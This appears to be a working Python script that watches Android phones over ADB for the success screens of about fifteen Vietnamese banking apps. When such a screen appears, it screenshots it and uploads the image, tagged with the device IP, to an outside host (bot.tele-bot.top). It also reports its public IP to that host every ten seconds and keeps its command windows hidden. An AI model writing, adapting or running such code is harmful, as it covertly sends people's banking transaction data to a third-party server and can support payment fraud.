import subprocess
import time
import os
import requests
import base64
import threading
import urllib.parse
import sys

import logging

# 设置日志记录
logging.basicConfig(
    filename='monitor.log',
    level=logging.INFO,
    format='[%(asctime)s] %(message)s',
    encoding='utf-8'
)

def log(msg):
    logging.info(msg)

# 记录每个 device_id 是否正在执行监听
is_running_by_device = {}

# 活动列表
# 活动列表，格式：activity_name: (备注前缀, 是否需要变化才触发)
activity_map = {
    "com.vnpay.bidv/.ui.activities.results.SuccessActivity": ("BIDV...", True),
    "com.vietinbank.ipay/.activity.SuccessActivity": ("VTB...", True),
    "com.VCB/.ui.activities.result.TransactionResultActivity": ("VCB...", True),
    "pgbankApp.pgbank.com.vn/com.pgbank.personal.ui.activities.confirm.SuccessActivity": ("PGBank...", True),
    "com.sacombank.ewallet/.ui.activity.MainVer2Activity": ("Sacombank...", False),
    "com.sunshine.ksbank/com.sunshine.mobile_banking.MainActivity": ("Kienlong...", False),
    "com.shinhan.global.vn.bank/.transfer.CompletedTransferActivity": ("SOL...", True),
    "com.bab.retailUAT/com.bab.retailUAT.MainActivity": ("BAB...", False),
    "com.vib.myvib2/com.vib.app.mvvm.payment.transfers.views.single.TransferOverviewActivity": ("MyVIB...", True),
    "vn.com.lpb.lienviet24h/com.lpb.lienviet24h.ui.main.MainActivity": ("LPBank...", False),
    "com.vnpay.hdbank/.activity.verify.SuccessActivity": ("VCB...", True),
    "vn.com.techcombank.bb.app/com.techcombank.retail.DEFAULT": ("Techcombank...", False),
    "mobile.acb.com.vn/com.acb_app.MainActivity": ("Techcombank...", False),
    "com.vnpay.Agribank3g/com.vnpay.agribank3g.ui.activities.confirm.SuccessActivity": ("AGRI...", True),
    "com.mbmobile/io.flutter.plugins.MainActivity": ("MB...", False),
}


def get_all_devices():
    """ 获取当前所有在线设备 """
    devices = []
    try:
        output = run_cmd_silently(["adb", "devices"])

        lines = output.strip().split("\n")
        for line in lines[1:]:  # 跳过第一行 "List of devices attached"
            line = line.strip()
            if line:
                parts = line.split("\t")
                if len(parts) == 2 and parts[1] == "device":
                    devices.append(parts[0])
    except Exception as e:
        log(f"获取设备列表时出错: {e}")
    return devices

def extract_ip_from_device_id(device_id):
    """ 去掉 device_id 里的端口号，保留纯 IP 地址 """
    return device_id.split(":")[0]  # 以 ':' 分割，取第一个部分

def is_device_connected(device_id):
    """ 判断 device_id 是否仍然在 adb devices 列表里 """
    return device_id in get_all_devices()

def get_current_activity(device_id):
    """ 获取指定设备的当前 Activity """
    result = run_cmd_silently(["adb", "-s", device_id, "shell", "dumpsys", "window"])

    last_activity = None
    for line in result.splitlines():
        if "mCurrentFocus" in line or "mFocusedApp" in line:
            parts = line.split()
            for part in parts:
                if "/" in part:
                    last_activity = part.strip("{}")
    return last_activity

def capture_screenshot(adb_path, device_id, screenshot_path):
    """ 截图并保存到本地 """
    run_cmd_silently([adb_path, "-s", device_id, "shell", "screencap", "-p", "/sdcard/screenshot1.png"])
    run_cmd_silently([adb_path, "-s", device_id, "pull", "/sdcard/screenshot1.png", screenshot_path])

    # log(f"[{device_id}] 截图保存成功: {screenshot_path}")

def upload_screenshot(image_path):
    """ 上传截图到服务器，返回上传后的路径 """
    url = 'https://bot.tele-bot.top/upload'
    with open(image_path, 'rb') as f:
        files = {'file': f}
        try:
            response = requests.post(url, files=files)
            if response.status_code == 200:
                try:
                    response_data = response.json()
                    if response_data.get('message') == 'successfully':
                        return response_data['path']
                    else:
                        log(f"上传失败，响应数据: {response_data}")
                except ValueError as e:
                    log(f"解析响应时出错: {e}")
                    log(f"响应内容: {response.text}")
            else:
                log(f"请求失败，状态码: {response.status_code}, 响应内容: {response.text}")
        except Exception as e:
            log(f"上传失败: {e}")
    return None

def get_local_ip():
    """获取本地公网IP地址"""
    try:
        response = requests.get("https://api.ipify.org?format=text", timeout=5)
        return response.text.strip()
    except Exception as e:
        log(f"获取本地IP出错: {e}")
        return "unknown"

def report_online_status():
    """定期上报设备在线状态到 Laravel 接口"""
    ip = get_local_ip()
    while True:
        try:
            response = requests.post("https://bot.tele-bot.top/online", data={"ip": ip}, timeout=5)

        except Exception as e:
            log(f"[在线] 上报出错: {e}")
        time.sleep(10)

def send_message_to_path(message_path, beizhu):
    """ 拼接备注和图片URL，并向 /zhangdan?message=xxx 发送 GET 请求 """
    try:
        encoded_message = utf8_to_base64_and_urlencode(beizhu, message_path)
        # log(encoded_message)
        url = f'https://bot.tele-bot.top/zhangdan?message={encoded_message}'
        # log(url)
        response = requests.get(url)
        # log('请求成功:', response.json())
    except Exception as e:
        log(f"请求失败: {e}")

def utf8_to_base64_and_urlencode(beizhu, message_path):
    """ 将(备注 + URL)先用UTF8编码，再用Base64编码，最后URL-Encode """
    combined_string = f"{beizhu}{message_path}"
    utf8_bytes = combined_string.encode('utf-8')
    base64_encoded = base64.b64encode(utf8_bytes).decode('utf-8')
    url_encoded = urllib.parse.quote(base64_encoded)
    return url_encoded

def monitor_activity_and_capture(device_id, beizhu):
    """ 监听设备 Activity 并执行截图，一旦设备断开，就退出循环 """
    global is_running_by_device

    if is_running_by_device.get(device_id, False):
        # log(f"设备 {device_id} 的监听程序正在执行，跳过本次调用。")
        return

    is_running_by_device[device_id] = True
    adb_path = "adb"
    screenshot_path = f"screenshot_{device_id}.png"

    last_activity = None

    try:
        while True:
            try:
                current_activity = get_current_activity(device_id)
            except subprocess.CalledProcessError as e:
                if not is_device_connected(device_id):
                    # log(f"[{device_id}] 设备已断开连接，结束监听。")
                    break
                else:
                    # log(f"[{device_id}] ADB命令调用出错: {e}")
                    time.sleep(1)
                    continue
            except Exception as e:
                # log(f"[{device_id}] 监听过程中出错: {e}")
                if not is_device_connected(device_id):
                    # log(f"[{device_id}] 设备已断开连接，结束监听。")
                    break
                else:
                    time.sleep(1)
                    continue

            # log(f"[{current_activity}] 上次活动: {last_activity}")
            if current_activity:
                # 只在页面变化时打印
                # if current_activity != last_activity:
                #     log(f"[{device_id}] 页面变化: 上次: {last_activity} => 当前: {current_activity}")
                matched = activity_map.get(current_activity)

                if matched:
                    beizhu_prefix, require_change = matched

                    # 如果要求变化，但当前页面和上次一样，就跳过
                    if require_change and current_activity == last_activity:

                        time.sleep(3)
                        continue

                    # log(f"[{device_id}] 匹配到活动: {current_activity}")
                    new_beizhu = f"{beizhu_prefix}{beizhu}..."

                    try:
                        capture_screenshot(adb_path, device_id, screenshot_path)
                        upload_path = upload_screenshot(screenshot_path)
                        if upload_path:
                            send_message_to_path(upload_path, new_beizhu)
                    except subprocess.CalledProcessError as ce:
                        if not is_device_connected(device_id):
                            # log(f"[{device_id}] 设备已断开连接（截图失败），结束监听。")
                            break
                        else:
                            log(f"[{device_id}] 截图过程中出错: {ce}")

                last_activity = current_activity
            time.sleep(3)

    finally:
        is_running_by_device[device_id] = False

def run_in_thread(device_id):
    """ 线程启动时执行的函数 """
    ip_address = extract_ip_from_device_id(device_id)  # 设备ID转换为 IP
    try:
        monitor_activity_and_capture(device_id, ip_address)
    except Exception as e:
        log(f"[{device_id}] 线程执行过程中发生错误: {e}")

def run_cmd_silently(args):
    """
    以静默方式调用 subprocess.check_output，
    避免在 Windows 下弹出独立的 CMD 窗口。
    """
    startupinfo = subprocess.STARTUPINFO()
    startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW  # 重要
    try:
        output = subprocess.check_output(
            args,
            startupinfo=startupinfo,
            creationflags=subprocess.CREATE_NO_WINDOW,
            encoding="utf-8",  # Python3
            errors="ignore"
        )
        return output
    except subprocess.CalledProcessError as e:
        # 如果命令执行非0返回，抛异常
        raise e
    except Exception as e:
        raise e

def auto_discover_devices(interval=5):
    """ 不断地循环扫描新的设备，启动监听线程 """
    # log("开始自动发现设备，扫描间隔(秒):"+ interval)
    while True:
        devices = get_all_devices()

        for device_id in devices:
            if not is_running_by_device.get(device_id, False):
                # log(f"发现新设备: {device_id}，为其启动监听线程...")
                t = threading.Thread(target=run_in_thread, args=(device_id,), daemon=True)
                t.start()

        time.sleep(interval)

if __name__ == "__main__":
    # 启动在线上报线程
    threading.Thread(target=report_online_status, daemon=True).start()

    auto_discover_devices(interval=5)

